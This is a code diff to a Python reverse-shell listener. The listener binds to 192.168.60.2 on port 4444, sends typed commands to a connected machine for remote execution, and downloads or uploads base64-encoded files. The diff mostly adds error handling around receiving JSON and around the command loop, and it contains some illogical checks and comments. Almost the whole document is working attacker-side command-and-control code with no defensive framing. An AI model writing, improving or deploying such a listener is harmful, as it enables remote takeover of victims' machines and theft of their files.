@@ -26,10 +26,15 @@ class Listener:
                 chunk = self.connection.recv(1024).decode()
                 if chunk: 
                     json_data += chunk
-                    # Try to decode if we have the complete JSON
-                    return json.loads(json_data)
-            except ValueError:
-                continue  # Keep trying to receive more data
+                    try:
+                        # Try to decode if we have the complete JSON
+                        return json.loads(json_data)
+                    except json.JSONDecodeError as e:
+                        print(f"Error decoding JSON: {e}")
+                        continue
+            except Exception as e:
+                print(f"Exception while receiving data : {e}")
+                break  # Keep trying to receive more data
 
     def execute_remotely(self, command):
         self.reliable_send(command)  # Send the command
@@ -49,21 +54,25 @@ class Listener:
         while True:
             command = input("Enter cmd >> ")
             command = command.split(" ")  # Split input into command and arguments
-            if command[0] == "exit":
-                self.reliable_send(command)
-                break
-            elif command[0] == "download" and len(command) > 1:
-                result = self.execute_remotely(command)
-                result = self.write_file(command[1], result)
-                print(result)
-            elif command[0] == "upload" and len(command) > 1:
-                file_content = self.read_file(command[1])  # Read and encode file content
-                command.append(file_content)  # Append the base64-encoded content to the command
-                result = self.execute_remotely(command)
-                print(result)
-            else:
-                result = self.execute_remotely(command)
-                print(result)
+            result = ''
+            try:
+                if command[0] == "exit":
+                    self.reliable_send(command)
+                    break
+                elif command[0] == "download" and "[-] Error " not in result:
+                    result = self.execute_remotely(command)
+                    result = self.write_file(command[1], result)
+                    print(result)
+                elif command[0] == "upload" and "[-] Error " not in result:
+                    file_content = self.read_file(command[1])  # Read and encode file content
+                    command.append(file_content)  # Append the base64-encoded content to the command
+                    result = self.execute_remotely(command)
+                    print(result)
+                else:
+                    result = self.execute_remotely(command)
+                    print(result)
+            except Exception:
+                result = "[-] Error during command execution."
         self.connection.close()
 
 my_listener = Listener("192.168.60.2", 4444)
